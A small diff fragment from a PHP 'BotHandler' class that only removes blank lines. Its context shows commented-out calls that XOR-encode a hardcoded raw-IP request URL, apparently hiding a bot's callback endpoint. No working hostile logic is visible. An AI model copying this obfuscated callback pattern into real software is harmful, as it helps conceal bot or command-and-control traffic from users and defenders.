@@ -23,9 +23,6 @@ class BotHandler{
 
 
     public function request(){
-
-
-
         if(empty($_POST)){
             //echo $this->xor_this("http://35.204.135.202/request");
             // echo $this->xor_this("#7%;y~dpdeqam`xvyscd14:6487;+!");
